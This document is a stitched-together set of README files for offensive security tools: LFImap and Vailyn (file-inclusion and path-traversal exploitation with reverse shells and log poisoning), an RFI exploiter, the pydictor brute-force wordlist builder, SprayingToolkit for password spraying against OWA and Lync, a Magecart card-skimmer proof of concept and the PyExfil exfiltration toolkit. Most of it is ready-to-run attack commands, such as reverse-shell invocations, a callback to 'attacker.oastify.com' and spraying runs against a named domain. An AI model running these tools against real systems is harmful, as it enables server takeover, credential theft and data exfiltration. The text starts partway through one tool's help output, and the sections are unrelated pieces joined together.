  -x, --exploit             Exploit and send reverse shell if RCE is available
  --lhost <lhost>           Local ip address for reverse connection
  --lport <lport>           Local port number for reverse connection
  --callback <hostname>     Callback location for rfi and cmd detection

WORDLIST OPTIONS:
  -wT <path>                Path to wordlist for path traversal modality
  --use-long                Use "src/wordlists/long.txt" wordlist for path traversal modality

OUTPUT OPTIONS:
  --log <file>              Output all requests and responses to specified file

OTHER:
  -v, --verbose             Print more detailed output when performing attacks
  -h, --help                Print this help message

```

### Examples 

#### 1) Utilize all supported attack modules with '-a'.
`python3 lfimap.py -U "http://IP/vuln.php?param=testme" -C "PHPSESSID=XXXXXXXX" -a`  

![LFImap_A](https://github.com/hansmach1ne/LFImap/assets/57464251/7692235a-dfcd-4cab-b0bd-aefdd873cae6)

#### 2) Post argument testing with '-D'

`python3 lfimap.py -U "http://IP/index.php" -D "page=testme" -a`

![LFIMAP_POST](https://github.com/hansmach1ne/LFImap/assets/57464251/ebd6b1a4-8990-4a36-b321-871fe9271313)


#### 3) Reverse shell remote command execution attack with '-x'
`python3 lfimap.py -U "http://IP/vuln.php?param=testme" -C "PHPSESSID=XXXXXXXX" -a -x --lhost <IP> --lport <PORT>`  

![LFIMAP_revshell](https://github.com/hansmach1ne/LFImap/assets/57464251/5d64244c-8a37-4019-bf2f-8fa7eb6bfd69)



#### 4) Out-of-Band blind vulnerability verbose testing support with '--callback'

`python3 lfimap.py -U "http://IP/index.php?param=testme" -a -v --callback="attacker.oastify.com"`

![LFIMAP_OOB](https://github.com/hansmach1ne/LFImap/assets/57464251/d49d3a80-1c34-49fd-97d8-eb870dae040d)


If you notice any issues with the software, please open up an issue. I will gladly take a look at it and try to resolve it, as soon as I can. <br>
Pull requests are welcome.

[!] Disclaimer: LFImap usage for attacking web applications without consent of the application owner is illegal. Developers assume no liability and are 
not responsible for any misuse and damage caused by using this program.

<h1>
RFI Exploiting
</h1>
<p>

-  A tool to Exploit Remote File Inclusion (RFI) Vulnerability
-  You can use the split targets for testing or find a target yourself

</p>

## Usage
```
  1. apt install python3
  2. git clone https://github.com/hosein-khanalizadeh/RFI.git
  3. cd RFI
  4. ls
  5. pip install -r requirements.txt
  6. python3 rfi.py
```

## Screenshot
![Screenshot](https://github.com/hosein-khanalizadeh/RFI/blob/main/rfi.png)



<h1 align="center">
  <img src='core/doc/logo.png' height='580'></img><br>
  Vailyn
  <br>
</h1>

<p align="center">
  <a href="https://github.com/VainlyStrain/Vailyn/blob/master/Vailyn">
    <img src="https://img.shields.io/static/v1.svg?label=Version&message=3.3&color=lightgrey&style=flat-square"><!--&logo=dev.to&logoColor=white"-->
  </a>
  <a href="https://www.python.org/">
    <img src="https://img.shields.io/static/v1.svg?label=Python&message=3.7%2B&color=lightgrey&style=flat-square&logo=python&logoColor=white">
  </a><br>
  Phased Path Traversal & LFI Attacks
</p>

> **Vailyn 3.0**
>
> Since v3.0, Vailyn supports LFI PHP wrappers in Phase 1. Use `--lfi` to include them in the scan.

### About

Vailyn is a multi-phased vulnerability analysis and exploitation tool for path traversal and file inclusion vulnerabilities. It is built to make it as performant as possible, and to offer a wide arsenal of filter evasion techniques.

### How does it work?

Vailyn operates in 2 phases. First, it checks if the vulnerability is present. It does so by trying to access /etc/passwd (or a user-specified file), with all of its evasive payloads. Analysing the response, payloads that worked are separated from the others.

Now, the user can choose freely which payloads to use. Only these payloads will be used in the second phase.

The second phase is the exploitation phase. Now, it tries to leak all possible files from the server using a file and a directory dictionary. The search depth and the directory permutation level can be adapted via arguments. Optionally, it can download found files, and save them in its loot folder. Alternatively, it will try to obtain a reverse shell on the system, letting the attacker gain full control over the server.

Right now, it supports multiple attack vectors: injection via query, path, cookie and POST data.

### Why the phase separation?

The separation in several phases is done to hugely improve the performance of the tool. In previous versions, every file-directory combination was checked with every payload. This resulted in a huge overhead due to payloads being always used again, despite not working for the current page.

### Installation

Recommended & tested Python versions are 3.7+, but it should work fine with Python 3.5 & Python 3.6, too. To install Vailyn, download the archive from the release tab, or perform

```
$ git clone https://github.com/VainlyStrain/Vailyn
```

Once on your system, you'll need to install the Python dependencies.

#### Unix Systems

On Unix systems, it is sufficient to run

```
$ pip install -r requirements.txt   # --user
```

#### Windows

Some libraries Vailyn uses do not work well with Windows, or will fail to install.

If you use Windows, use `pip` to install the requirements listed in `Vailyn\·›\requirements-windows.txt`.

If twisted fails to install, there is an unofficial version available [here](https://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted), which should build under Windows. Just bear in mind that this is a 3rd party download, and the integrity isn't necessarily guaranteed. After this installed successfully, running pip again on `requirements-windows.txt` should work.

#### Final Steps

If you want to fully use the reverse shell module, you'll need to have `sshpass`, `ncat` and `konsole` installed. Package names vary by Linux distribution. On Windows, you'll need to start the listener manually beforehand. If you don't like `konsole`, you can specify a different terminal emulator in `core/config.py`.

That's it! Fire Vailyn up by moving to its installation directory and performing

```
$ python Vailyn -h
```

### Usage

Vailyn has 3 mandatory arguments: `-v VIC, -a INT and -p2 TP P1 P2`. However, depending on `-a`, more arguments may be required.

```
   ,                \                  /               , 
     ':.             \.      /\.     ./            .:'
        ':;.          :\ .,:/   ''. /;        ..::'
           ',':.,.__.'' '          ' `:.__:''.:'
              ';..                        ,;'     *
       *         '.,                   .:'
                    `v;.            ;v'        o
              .      '  '..      :.' '     .
                     '     ':;, '    '
            o                '          .   :        
                                           *
                         | Vailyn |
                      [ VainlyStrain ]
    
Vsynta Vailyn -v VIC -a INT -p2 TP P1 P2 
        [-p PAM] [-i F] [-Pi VIC2]
      [-c C] [-n] [-d I J K]
       [-s T] [-t] [-L]
  [-l] [-P] [-A] 

mandatory:
  -v VIC, --victim VIC  Target to attack, part 1 [pre-payload]
  -a INT, --attack INT  Attack type (int, 1-5, or A)

    A|  Spider (all)       2|  Path               5|  POST Data, json
    P|  Spider (partial)   3|  Cookie
    1|  Query Parameter    4|  POST Data, plain

  -p2 TP P1 P2, --phase2 TP P1 P2
                        Attack in Phase 2, and needed parameters

┌[ Values ]─────────────┬────────────────────┐
│ TP      │ P1          │ P2                 │
├─────────┼─────────────┼────────────────────┤
│ leak    │ File Dict   │ Directory Dict     │
│ inject  │ IP Addr     │ Listening Port     │
│ implant │ Source File │ Server Destination │
└─────────┴─────────────┴────────────────────┘

additional:
  -p PAM, --param PAM   query parameter or POST data for --attack 1, 4, 5
  -i F, --check F       File to check for in Phase 1 (df: etc/passwd)
  -Pi VIC2, --vic2 VIC2 Attack Target, part 2 [post-payload]
  -c C, --cookie C      Cookie to append (in header format)
  -l, --loot            Download found files into the loot folder
  -d I J K, --depths I J K
                        depths (I: phase 1, J: phase 2, K: permutation level)
  -h, --help            show this help menu and exit
  -s T, --timeout T     Request Timeout; stable switch for Arjun
  -t, --tor             Pipe attacks through the Tor anonymity network
  -L, --lfi             Additionally use PHP wrappers to leak files
  -n, --nosploit        skip Phase 2 (does not need -p2 TP P1 P2)
  -P, --precise         Use exact depth in Phase 1 (not a range)
  -A, --app             Start Vailyn's Qt5 interface

develop:
  --debug               Display every path tried, even 404s.
  --version             Print program version and exit.
  --notmain             Avoid notify2 crash in subprocess call.

Info:
  to leak files using absolute paths: -d 0 0 0
  to get a shell using absolute paths: -d 0 X 0
```

Vailyn currently supports 5 attack vectors, and provides a crawler to automate all of them. The attack performed is identified by the `-a INT` argument.

```
INT        attack
----       -------
1          query-based attack  (https://site.com?file=../../../)
2          path-based attack   (https://site.com/../../../)
3          cookie-based attack (will grab the cookies for you)
4          plain post data     (ELEM1=VAL1&ELEM2=../../../)
5          json post data      ({"file": "../../../"})
A          spider              fetch + analyze all URLs from site using all vectors
P          partial spider      fetch + analyze all URLs from site using only selected vectors
```

You also must specify a target to attack. This is done via `-v VIC` and `-Pi VIC2`, where -v is the part before the injection point, and -Pi the rest.

Example: if the final URL should look like: `https://site.com/download.php?file=<ATTACK>&param2=necessaryvalue`, you can specify `-v https://site.com/download.php` and `-Pi &param2=necessaryvalue` (and `-p file`, since this is a query attack).

If you want to include PHP wrappers in the scan (like php://filter), use the `--lfi` argument. At the end of Phase 1, you'll be presented with an additional selection menu containing the wrappers that worked. (if any)

If the attacked site is behind a login page, you can supply an authentication cookie via `-c COOKIE`. If you want to attack over Tor, use `--tor`.

#### Phase 1

This is the analysis phase, where working payloads are separated from the others.

By default, `/etc/passwd` is looked up. If the server is not running Linux, you can specify a custom file by `-i FILENAME`. Note that you must **include subdirectories in FILENAME**.
You can modify the lookup depth with the first value of `-d` (default=8).
If you want to use absolute paths, set the first depth to 0.

#### Phase 2

This is the exploitation phase, where Vailyn will try to leak as much files as possible, or gain a reverse shell using various techniques.

The depth of lookup in phase 2 (the maximal number of layers traversed back) is specified by the second value of the `-d` argument. The level of subdirectory permutation is set by the third value of `-d`.

If you attack with absolute paths and perform the leak attack, set all depths to 0. If you want to gain a reverse shell, make sure that the second depth is greater than 0.

By specifying `-l`, Vailyn will not only display files on the terminal, but also download and save the files into the loot folder.

If you want a verbose output (display every output, not only found files), you can use `--debug`. Note that output gets really messy, this is basically just a debug help.

To perform the bruteforce attack, you need to specify `-p2 leak FIL PATH`, where
* FIL is a dictionary file containing **filenames only** (e.g. index.php)
* PATH, is a dictionary file containing **directory names only**. Vailyn will handle directory permutation for you, so you'll need only one directory per line.

To gain a reverse shell by code injection, you can use `-p2 inject IP PORT`, where
* IP is your listening IP
* PORT is the port you want to listen on.

> **WARNING**
>
> Vailyn employs Log Poisoning techniques. Therefore, YOUR SPECIFIED IP WILL BE VISIBLE IN THE SERVER LOGS.

The techniques (only work for LFI inclusions):

* `/proc/self/environ inclusion` only works on outdated servers
* `Apache + Nginx Log Poisoning & inclusion`
* `SSH Log Poisoning` 
* `poisoned mail inclusion`
* wrappers
    * `expect://`
    * `data:// (plain & b64)`
    * `php://input`

### False Positive prevention

To distinguish real results from false positives, Vailyn does the following checks:
* check the status code of the response
* check if the response is identical to one taken before attack start: this is useful e.g, when the server returns 200, but ignores the payload input or returns a default page if the file is not found.
* similar to #2, perform an additional check for query GET parameter handling (useful when server returns error that a needed parameter is missing)
* check for empty responses
* check if common error signatures are in the response content
* check if the payload is contained in the response: this is an additional check for the case the server responds 200 for non-existing files, and reflects the payload in a message (like ../../secret not found)
* check if the entire response is contained in the init check response: useful when the server has a default include which disappears in case of 404
* for `-a 2`, perform an additional check if the response content matches the content from the server root URL
* REGEX check for `/etc/passwd` if using that as lookup file

### Examples

* Simple Query attack, leaking files in Phase 2:
`$ Vailyn -v "http://site.com/download.php" -a 1 -p2 leak dicts/files dicts/dirs -p file` --> `http://site.com/download.php?file=../INJECT`

* Query attack, but I know a file `file.php` exists on exactly 2 levels above the inclusion point:
`$ Vailyn -v "http://site.com/download.php" -a 1 -p2 leak dicts/files dicts/dirs -p file -i file.php -d 2 X X -P`
This will shorten the duration of Phase 1 very much, since its a targeted attack.

* Simple Path attack:
`$ Vailyn -v "http://site.com/" -a 2 -p2 leak dicts/files dicts/dirs` --> `http://site.com/../INJECT`

* Path attack, but I need query parameters and tag:
`$ Vailyn -v "http://site.com/" -a 2 -p2 leak dicts/files dicts/dirs -Pi "?token=X#title"` --> `http://site.com/../INJECT?token=X#title`

* Simple Cookie attack:
`$ Vailyn -v "http://site.com/cookiemonster.php" -a 3 -p2 leak dicts/files dicts/dirs`
Will fetch cookies and you can select cookie you want to poison

* POST Plain Attack:
`$ Vailyn -v "http://site.com/download.php" -a 4 -p2 leak dicts/files dicts/dirs -p "DATA1=xx&DATA2=INJECT"`
will infect DATA2 with the payload

* POST JSON Attack:
`$ Vailyn -v "http://site.com/download.php" -a 5 -p2 leak dicts/files dicts/dirs -p '{"file": "INJECT"}'`

* Attack, but target is behind login screen:
`$ Vailyn -v "http://site.com/" -a 1 -p2 leak dicts/files dicts/dirs -c "sessionid=foobar"`

* Attack, but I want a reverse shell on port 1337:
`$ Vailyn -v "http://site.com/download.php" -a 1 -p2 inject MY.IP.IS.XX 1337  # a high Phase 2 Depth is needed for log injection`
(will start a ncat listener for you if on Unix)

* Full automation in crawler mode:
`$ Vailyn -v "http://root-url.site" -a A` _you can also specify other args, like cookie, depths, lfi & lookup file here_ 

* Full automation, but Arjun needs `--stable`:
`$ Vailyn -v "http://root-url.site" -a A -s ANY`

### Demo

[![asciicast](https://asciinema.org/a/384813.svg)](https://asciinema.org/a/384813)
Vailyn's Crawler analyzing a damn vulnerable web application. LFI Wrappers are not enabled.

[GUI Demonstration (v2.2.1-5)](https://www.youtube.com/watch?v=rFlR_SHk9fc)

### Possible Issues

Found some false positives/negatives (or want to point out other bugs/improvements): please leave an issue!

### Code of Conduct

> Vailyn is provided as an offensive web application audit tool. It has built-in functionalities which can reveal potential vulnerabilities in web applications, which could be exploited maliciously.
>
> **THEREFORE, NEITHER THE AUTHOR NOR THE CONTRIBUTORS ARE RESPONSIBLE FOR ANY MISUSE OR DAMAGE DUE TO THIS TOOLKIT.**
>
> By using this software, the user obliges to follow their local laws, to not attack someone else's system without explicit permission from the owner, or with malicious intent.
>
> In case of an infringement, only the end user who committed it is accountable for their actions.

### Credits & Copyright

> Vailyn: Copyright © <a href="https://github.com/VainlyStrain">VainlyStrain</a>
>
> Arjun:  Copyright © <a href="https://github.com/s0md3v">s0md3v</a>

Arjun is no longer distributed with Vailyn. Install its latest version via pip.


# pydictor

[![build](https://img.shields.io/badge/build-passing-brightgreen.svg)](https://www.github.com/landgrey/pydictor)  [![Python 2.7&3.4](https://img.shields.io/badge/python-2.7&3.4-yellow.svg)](https://www.python.org/)  ![release](https://img.shields.io/badge/version-2.1.7.3-orange.svg) ![License](https://img.shields.io/badge/license-GPLv3-red.svg)


**README.md [中文版](README_CN.md)**

##### pydictor —— A powerful and useful hacker dictionary builder for a brute-force attack
                          _ _      _
          _ __  _   _  __| (_) ___| |_ ___  _ __
         | '_ \| | | |/ _` | |/ __| __/ _ \| '__|
         | |_) | |_| | (_| | | (__| || (_) | |
         | .__/ \__, |\__,_|_|\___|\__\___/|_|
         |_|    |___/                         


##### Email: LandGrey@qq.com

-
## Preface：
```
Q: Why I need to use pydictor ?
A: 1.it always can help you
      You can use pydictor to generate a general blast wordlist, a custom wordlist based on Web content, a social engineering wordlist, and so on;
      You can use the pydictor built-in tool to safe delete, merge, unique, merge and unique,  count word frequency to filter the wordlist, 
      besides, you also can specify your wordlist and use '-tool handler' to filter your wordlist;

   2.highly customized
      You can generate highly customized and complex wordlist by modify multiple configuration files, 
      add your own dictionary, using leet mode, filter by length、char occur times、types of different char、regex,
      even add customized encode scripts in /lib/encode/ folder, add your own plugin script in /plugins/ folder,
      add your own tool script in /tools/ folder.

   3.powerful and flexible configuration file parsing
      nothing to say,skilled use and you will love it

   4.great compatibility
     whether you are using Python 2.7 version or Python 3.x version , pydictor can be run on Windows, Linux or Mac;
```

#### legal disclaimer
```
1. Usage of pydictor for attacking targets without prior mutual consent is illegal. 
2. It is the end user's responsibility to obey all applicable local, state and federal laws.
3. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
```

## Start:
```
git clone --depth=1 --branch=master https://www.github.com/landgrey/pydictor.git
cd pydictor/
chmod +x pydictor.py
python pydictor.py
```

## Overview：

![extend](/docs/screenshot/extend.png "extend")

![conf](/docs/screenshot/conf.png "conf")

![social engineering dictionary builder](/docs/screenshot/sedb.png "sedb")

## Quick use:
#### [Usage document](/docs/doc/usage.md)

#### [API develop document](/docs/doc/api.md)
#

#### *There's a trick about how to use pydictor: Know what you want type of word list.*
#
#### All of pydictor can generating wordlist

|  type  | wordlist  | identifier | description                                         | supported function |
| :----: | :-------: | :--------: | :-------------------------------------------------- | :----------------- |
|  core  |   base    |     C1     | basic wordlist                                      | F1 F2 F3 F4        |
|  core  |   char    |     C2     | custom character wordlist                           | F1 F2 F3 F4        |
|  core  |   chunk   |     C3     | permutation and combination wordlist                | ALL                |
|  core  |   conf    |     C4     | based on configuration file wordlist                | ALL                |
|  core  |  pattern  |     C5     | fastly generate pattern wordlist                    | F2 F3 F4           |
|  core  |  extend   |     C6     | extend wordlist based on rules                      | ALL                |
|  core  |   sedb    |     C7     | social engineering wordlist                         | ALL                |
|  tool  | combiner  |     T1     | combine the specify directory files tool            |                    |
|  tool  | comparer  |     T2     | compare two file content difference tool            | ALL                |
|  tool  |  counter  |     T3     | word frequency count tool                           | ALL                |
|  tool  |  handler  |     T4     | handle the input file tool                          | ALL                |
|  tool  | uniqbiner |     T5     | combine and unique the directory files tool         | ALL                |
|  tool  | uniqifer  |     T6     | unique the input file tool                          | ALL                |
|  tool  | hybrider  |     T7     | hybrid couples word list tool                       | F1 F2 F3 F4        |
|  tool  | printabler|     T8     | filter printable character tool                     | ALL                |
| plugin | birthday  |     P1     | birthday keyword wordlist in specify datetime scope | ALL                |
| plugin |    ftp    |     P2     | against keyword generate ftp password wordlist      | ALL                |
| plugin |   pid4    |     P3     | id card last 4 char wordlist                        | ALL                |
| plugin |   pid6    |     P4     | id card last 6 char wordlist                        | ALL                |
| plugin |   pid8    |     P5     | id card last 8 char wordlist                        | ALL                |
| plugin |  scratch  |     P6     | wordlist based on web pages keywords                | ALL                |


#### function code

| function | code | description                              |
| :------- | :--: | :--------------------------------------- |
| len      |  F1  | the scope of length                      |
| head     |  F2  | add items prefix                         |
| tail     |  F3  | add items suffix                         |
| encode   |  F4  | encode the items                         |
| occur    |  F5  | filter by occur times of letter、digital、special chars |
| types    |  F6  | filter by types of letter、digital、special chars |
| regex    |  F7  | filter by regex                          |
| level    |  F8  | set the word list rule level             |
| leet     |  F9  | enable 1337 mode                         |
| repeat   |  F10 | filter by consecutive repeat times of letter、digital、special chars |

#### encode function supported encodings and encryptions

|  name  | description                              |
| :----: | :--------------------------------------- |
|  none  | default, don't encode                    |
|  b16   | base16 encode                            |
|  b32   | base32 encode                            |
|  b64   | base64 encode                            |
|  des   | des algorithm, need modify code          |
| execjs | execute js function, need modify code    |
|  hmac  | hmac message digest algorithm            |
|  md5   | md5 message digest algorithm output 32 char |
| md516  | md5 message digest algorithm output 16 char |
|  rsa   | rsa algorithm, need modify code          |
|  sha1  | sha-1 message digest algorithm           |
| sha256 | sha-256 message digest algorithm         |
| sha512 | sha-512 message digest algorithm         |
|  url   | url encode                               |
|  test  | a custom encode method example           |


#### occur function
`Usage  : --occur [letters_occur_times_range] [digital_occur_times_range] [special_chars_occur_times_range]`

`Example: --occur ">=4" "<6" "==0"`


#### types function
`Usage  : --types [letters_types_range] [digital_types_range] [special_types_range]`

`Example: --types "<=8" "<=4" "==0"`


#### repeat function
`Usage  : --repeat [letters_repeat_times] [digital_repeat_times] [special_repeat_times]`

`Example: --repeat "<=3" ">=3" "==0"`


#### regex function
`Usage  : --regex [regex]`

`Example: --regex "^z.*?g$"`


#### level function
`Usage  : --level [level]`

`Example: --level 4      level >= 4 will be work in /funcfg/extend.conf`


##### default leet table
`leet char = replace char, and in /funcfg/leet_mode.conf`

```
a = 4
b = 6
e = 3
l = 1
i = 1
o = 0
s = 5
```

##### code
```
0            default，replace all
1            left-to-right, replace all the first encountered leet char
2            right-to-left, replace all the first encountered leet char
11-19        left-to-right, replace the first encountered leet char to maximum code-10 chars   
21-29        right-to-left, replace the first encountered leet char to maximum code-20 chars
```

##### leet mode code effection table

| code |   old string    |   new string    |
| :--: | :-------------: | :-------------: |
|  0   | as a airs trees | 45 4 41r5 tr335 |
|  1   | as a airs trees | 4s 4 4irs trees |
|  2   | as a airs trees | a5 a air5 tree5 |
|  11  | as a airs trees | 4s a airs trees |
|  12  | as a airs trees | 4s 4 airs trees |
|  13  | as a airs trees | 4s 4 4irs trees |
|  14  | as a airs trees | 4s 4 4irs trees |
| ...  | as a airs trees | 4s 4 4irs trees |
|  21  | as a airs trees | as a airs tree5 |
|  22  | as a airs trees | as a air5 tree5 |
|  23  | as a airs trees | a5 a air5 tree5 |
|  24  | as a airs trees | a5 a air5 tree5 |
| ...  | as a airs trees | a5 a air5 tree5 |


##### Destination is just a point of departure，It's your show time.


# Deprecation Notice

This project is no longer maintained. The following alternative projects are better and actively maintained:

- [TREVORspray](https://github.com/blacklanternsecurity/TREVORspray)
- [CredMaster](https://github.com/knavesec/CredMaster)

# SprayingToolkit

<p align="center">
  <img src="http://38.media.tumblr.com/79d7e2a376cb96fb581b3453070f6229/tumblr_ns5suorqYu1szok8ro1_500.gif" alt="SprayingToolkit"/>
</p>


## Description

A set of Python scripts/utilities that *tries* to make password spraying attacks against Lync/S4B & OWA a lot quicker, less painful and more efficient.

## Sponsors
[<img src="https://www.blackhillsinfosec.com/wp-content/uploads/2016/03/BHIS-logo-L-300x300.png" width="130" height="130"/>](https://www.blackhillsinfosec.com/)
[<img src="https://handbook.volkis.com.au/assets/img/Volkis_Logo_Brandpack.svg" width="130" hspace="10"/>](https://volkis.com.au)
[<img src="https://user-images.githubusercontent.com/5151193/85817125-875e0880-b743-11ea-83e9-764cd55a29c5.png" width="200" vspace="21"/>](https://qomplx.com/blog/cyber/)
[<img src="https://user-images.githubusercontent.com/5151193/86521020-9f0f4e00-be21-11ea-9256-836bc28e9d14.png" width="250" hspace="20"/>](https://ledgerops.com)
[<img src="https://user-images.githubusercontent.com/5151193/87607538-ede79e00-c6d3-11ea-9fcf-a32d314eb65e.png" width="170" hspace="20"/>](https://www.guidepointsecurity.com/)
[<img src="https://user-images.githubusercontent.com/5151193/95542303-a27f1c00-09b2-11eb-8682-e10b3e0f0710.jpg" width="200" hspace="20"/>](https://lostrabbitlabs.com/)

## Official Discord Channel

Come hang out on Discord!

[![Porchetta Industries](https://discordapp.com/api/guilds/736724457258745996/widget.png?style=banner3)](https://discord.gg/khRyjTg)

## Installation

Install the pre-requisites with `pip3` as follows:

```bash
sudo -H pip3 install -r requirements.txt
```

Or use a Python virtual environment if you don't want to install the packages globally.

## Tool Overview

### Atomizer

A blazing fast password sprayer for Lync/Skype For Business and OWA, built on Asyncio and Python 3.7

#### Usage
```
Usage:
    atomizer (lync|owa|imap) <target> <password> <userfile> [--targetPort PORT] [--threads THREADS] [--debug]
    atomizer (lync|owa|imap) <target> <passwordfile> <userfile> --interval <TIME> [--gchat <URL>] [--slack <URL>] [--targetPort PORT][--threads THREADS] [--debug]
    atomizer (lync|owa|imap) <target> --csvfile CSVFILE [--user-row-name NAME] [--pass-row-name NAME] [--targetPort PORT] [--threads THREADS] [--debug]
    atomizer (lync|owa|imap) <target> --user-as-pass USERFILE [--targetPort PORT] [--threads THREADS] [--debug]
    atomizer (lync|owa|imap) <target> --recon [--debug]
    atomizer -h | --help
    atomizer -v | --version

Arguments:
    target         target domain or url
    password       password to spray
    userfile       file containing usernames (one per line)
    passwordfile   file containing passwords (one per line)

Options:
    -h, --help               show this screen
    -v, --version            show version
    -c, --csvfile CSVFILE    csv file containing usernames and passwords
    -i, --interval TIME      spray at the specified interval [format: "H:M:S"]
    -t, --threads THREADS    number of concurrent threads to use [default: 3]
    -d, --debug              enable debug output
    -p, --targetPort PORT    target port of the IMAP server (IMAP only) [default: 993]
    --recon                  only collect info, don't password spray
    --gchat URL              gchat webhook url for notification
    --slack URL              slack webhook url for notification
    --user-row-name NAME     username row title in CSV file [default: Email Address]
    --pass-row-name NAME     password row title in CSV file [default: Password]
    --user-as-pass USERFILE  use the usernames in the specified file as the password (one per line)
```

#### Examples

```bash
./atomizer.py owa contoso.com 'Fall2018' emails.txt
```

```bash
./atomizer.py lync contoso.com 'Fall2018' emails.txt
```

```bash
./atomizer lync contoso.com --csvfile accounts.csv
```

```bash
./atomizer lync contoso.com --user-as-pass usernames.txt
```

```bash
./atomizer owa 'https://owa.contoso.com/autodiscover/autodiscover.xml' --recon
```

```bash
./atomizer.py owa contoso.com passwords.txt emails.txt -i 0:45:00 --gchat <GCHAT_WEBHOOK_URL>
```

### Vaporizer

A port of [@OrOneEqualsOne](https://twitter.com/OrOneEqualsOne)'s [GatherContacts](https://github.com/clr2of8/GatherContacts) Burp extension to [mitmproxy](https://mitmproxy.org/) with some improvements.

Scrapes Google and Bing for LinkedIn profiles, automatically generates emails from the profile names using the specified pattern and performes password sprays in real-time.

(Built on top of Atomizer)

#### Examples

```bash
mitmdump -s vaporizer.py --set sprayer=(lync|owa) --set domain=domain.com --set target=<domain or url to spray> --set password=password --set email_format='{f}.{last}'
```

By default `email_format` is set to `{first}.{last}` pattern and is not a required argument.

The `domain` parameter is the domain to use for generating emails from names, the `target` parameter is the domain or url to password spray

Install the mitmproxy cert, set the proxy in your browser, go to google and/or bing and search (make sure to include the `/in`):

`site:linkedin.com/in "Target Company Name"`

Emails will be dumped to `emails.txt` in the specified format, and passed to Atomizer for spraying.


### Aerosol

Scrapes all text from the target website and sends it to [AWS Comprehend](https://aws.amazon.com/comprehend/) for analysis to generate custom wordlists for password spraying.

**Still a work in progress**

#### Usage

```bash
mitmdump -s aerosol.py --set domain=domain.com
```

### Spindrift

Converts names to active directory usernames (e.g `Alice Eve` => `CONTOSO\aeve`)

#### Usage

```
Usage:
    spindrift [<file>] [--target TARGET | --domain DOMAIN] [--format FORMAT]

Arguments:
    file    file containing names, can also read from stdin

Options:
    --target TARGET   optional domain or url to retrieve the internal domain name from OWA
    --domain DOMAIN   manually specify the domain to append to each username
    --format FORMAT   username format [default: {f}{last}]
```

#### Examples

Reads names from STDIN, `--domain` is used to specify the domain manually:

```bash
cat names.txt | ./spindrift.py --domain CONTOSO
```

Reads names from `names.txt`, `--target` dynamically grabs the internal domain name from OWA (you can give it a domain or url)

```bash
./spindrift.py names.txt --target contoso.com
```


------------------------------------------------------------------------------------------------------


# Credentiais Advanced Attacks

# magecartskimmerPOC
 Proof of concept for Darknet Diaries report on Magecart Skimmer
 
 
 Steps to use (no server needed)

1. Place all file into one directory. 

2. visitin index page

3. Fill out forms as if you were checking out

4. Check out

5. Investigate

Steps to use (with  simple python server)

go into ccserver folder

1. setup python (3.6) 

2. install depencies for environment with "pip install -r reqs.txt"


go into website directory

1. visitin index page

2. Fill out forms as if you were checking out

3. Check out

4. Investigate


Educational Beneits

Host-based signatures - depending how on how the malcious javascript is 
implemented and the Content Delivery Network compromised, host artifacts can be affected 


![pocpic](eskimmerpoc.png)



# PyExfil
Stress Testing Detection & Creativity

[![Contributions Welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=round)](https://github.com/ytisf/PyExfil/issues)
[![HitCount](http://hits.dwyl.com/ytisf/PyExfil.svg)](http://hits.dwyl.com/ytisf/PyExfil)
[![PyPI download month](https://img.shields.io/pypi/dm/ansicolortags.svg)](https://pypi.python.org/pypi/pyexfil/)
[![PyPI license](https://img.shields.io/pypi/l/ansicolortags.svg)](https://pypi.python.org/pypi/pyexfil/)
[![GitHub stars](https://img.shields.io/github/stars/ytisf/PyExfil.svg?style=social&label=Star&maxAge=2592000)](https://GitHub.com/ytisf/PyExfil/stargazers/)
[![made-with-python](https://img.shields.io/badge/Made%20with-Python-1f425f.svg)](https://www.python.org/)

![Logo](https://www.morirt.com/img/PyExfil_Logo.png)

PyExfil was born as a PoC and kind of a playground and grew to be something a bit more. In my eyes it's still a messy PoC that needs a lot more work and testing to become `stable`. The purpose of PyExfil is to set as many exfiltration, and now also communication, techniques that **CAN** be used by various threat actors/malware around to bypass various detection and mitigation tools and techniques. You can track changes at the official [GitHub page](https://PyExfil.MoriRT.com/).

Putting it simply, it's meant to be used as a testing tool rather than an actual Red Teaming tool. Although most techniques and methods should be easily ported and compiled to various operating systems, some stable some experimental, the transmission mechanism should be stable on all techniques. Clone it, deploy on a node in your organization and see which systems can catch which techniques.

## Getting Started

### PIP
For using `pip` (not necessarily the most updated):
```bash
pip install --user PyExfil
```

### Prerequisites
For source:
```bash
git clone https://www.github.com/ytisf/PyExfil
cd PyExfil
pip install --user -r requirements.txt
```

We recommend installing [`py2exe`](http://www.py2exe.org/) as well so that you may cross compile various modules to a binary for easier transportation. You can do that with:

```bash
pip install py2exe
```

### Installing

Go to the same folder where `PyExfil` was cloned to and:
```bash
pip setup.py --user install
```

## List of Techniques

* **Network**
  * [DNS query](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#dns-query)
  * [HTTP Cookie](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#http-cookies)
  * [ICMP (8)](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#icmp-echo-8)
  * [NTP Body](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#ntp-body)
  * [BGP Open](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#bgp-open)
  * [HTTPS Replace Certificate](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#https-replace-certificate)
  * [QUIC - No Certificate](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#quic)
  * [Slack Exfiltration](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#slack)
  * [POP3 Authentication](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#pop3-authentication) (as password) - Idea thanks to [Itzik Kotler](https://github.com/ikotler)
  * [FTP MKDIR](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#ftp-mkdir) - Idea thanks to [Itzik Kotler](https://github.com/ikotler)
  * [Source IP-based Exfiltration](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#source-ip-based-exfiltration)
  * [HTTP Response](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#http-response)
  * [IMAP_Draft](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#imap-draft)
* **Communication**
  * [NTP Request](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#ntp-request)
  * [DropBox LSP](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#dropbox-lsp) (Broadcast or Unicast)
  * [DNS over TLS](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#dns-over-tls)
  * [ARP Broadcast](https://github.com/ytisf/PyExfil/blob/master/USAGE.md#arp-broadcast)
